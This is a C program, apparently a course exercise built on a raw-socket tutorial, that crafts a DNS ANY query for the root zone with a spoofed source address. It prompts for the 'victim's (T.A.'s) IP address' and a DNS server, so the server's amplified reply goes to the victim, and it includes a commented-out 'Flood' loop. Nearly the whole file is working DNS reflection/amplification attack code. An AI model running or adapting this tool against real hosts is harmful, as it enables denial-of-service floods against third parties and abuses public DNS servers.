/*
	Raw UDP sockets, 
	source: https://www.binarytides.com/raw-udp-sockets-c-linux/
*/
#include<stdio.h>	//for printf
#include<string.h> //memset
#include<sys/socket.h>	//for socket ofcourse
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
/* 
	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/

#define T_A 1

struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

struct DNS_header
{
	unsigned short id;

	unsigned char rd:1;
	unsigned char tc:1;
	unsigned char aa:1;
	unsigned char opcode:4;
	unsigned char qr:1;
	
	unsigned char rcode:4;
	unsigned char cd:1;
	unsigned char ad:1;
	unsigned char z:1;
	unsigned char ra:1;
	
	unsigned short q_count;
	unsigned short ans_count;
	unsigned short auth_count;
	unsigned short extra_count;
};

struct DNS_question
{
	unsigned short q_type;
	unsigned short q_class;
};

struct DNS_RR
{
	unsigned short a_type;
	unsigned short a_class;
	unsigned short a_ttl;
	//unsigned char* a_rdlength;
	//unsigned char* a_name;
	//unsigned char* a_rdata;
	//struct DNS_answer_data *ans_data;
};

typedef struct
{
	unsigned char *header;
	struct DNS_question *question;
} DNS_Query;

/*
	Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}


void format_name(unsigned char* dns_name, unsigned char* website_name)
{
	int z = 0;
	strcat((char*)website_name, ".");
	for(int i = 0; i < strlen((char*)website_name); i++)
	{
		if(website_name[i] == '.')
		{
			*dns_name++ = (int)(i - z);
			for(;z<i;z++)
			{
				*dns_name++ = website_name[z];
			}
			z = i;
			z++;
		}
	}
	*dns_name++ = '\0';
}

int main (void)
{
	//Create a raw socket of type IPPROTO
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}
	
	//Datagram to represent the packet
	char datagram[4048] , source_ip[32] , *data, *pseudogram, databuff[2048];
	
	//zero out the packet buffer
	memset (datagram, 0, 4048);
	
	memset (databuff, 0, 2048);
	
	//IP header
	//struct iphdr *iph = (struct iphdr *) datagram;
	struct iphdr *iph = (struct iphdr *) &datagram;	


	//UDP header
	struct udphdr *udph = (struct udphdr *)&datagram[sizeof (struct ip)];
	
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	
	//DNS Packet Craft
	
	struct DNS_header *dns = (struct DNS_header *) &datagram[sizeof(struct iphdr) + sizeof(struct udphdr)];
	

	dns->id = (unsigned short) htons(getpid());
	dns->qr = 0;
	dns->opcode = 0;
	dns->aa = 0;
	dns->tc = 0;
	dns->rd = 1;
	dns->ra = 0;
	dns->z = 0;
	dns->ad = 0;
	dns->cd = 0;
	dns->rcode = 0;
	dns->q_count = htons(1);
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->extra_count = 0;

	
	//The only address needed to resolve is a period
	char address_array[] = ".";
	unsigned char *q_name = (unsigned char *)&datagram[(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_header))];
	format_name(q_name, address_array);


	struct DNS_question *quest = (struct DNS_question *)&datagram[sizeof(struct DNS_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + strlen((unsigned char *)q_name)+1];
	quest->q_type = htons( 255 );
	quest->q_class = htons(1);
	


	char source_ip_addr[100];
	printf("Please input the victim's (T.A.'s) IP address: ");
	scanf("%s", source_ip_addr);

	char DNS_server_ip_addr[100];
	printf("Please input the IP address of a DNS server: ");
	scanf("%s", DNS_server_ip_addr);


	
	//some address resolution
	strcpy(source_ip , source_ip_addr);
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr(DNS_server_ip_addr);
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question);
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	
	//UDP header
	udph->source = htons (6666);
	udph->dest = htons (53);
	udph->len = htons(8 + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question));	//tcp header size
	udph->check = 0;	//leave checksum 0 now, filled later by pseudo header
	
	//Now the UDP checksum using the pseudo header
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question));
	
	udph->check = csum( (unsigned short*) pseudogram , psize);

	
	//Flood
	//while (true)
	{
		//Send the packet
		if (sendto (s, (char*)datagram, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof(struct DNS_header) + (strlen((const char*)q_name)+1) + sizeof(struct DNS_question), 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send. Length : %d \n" , iph->tot_len);
		}
		
	}
	
	return 0;
}
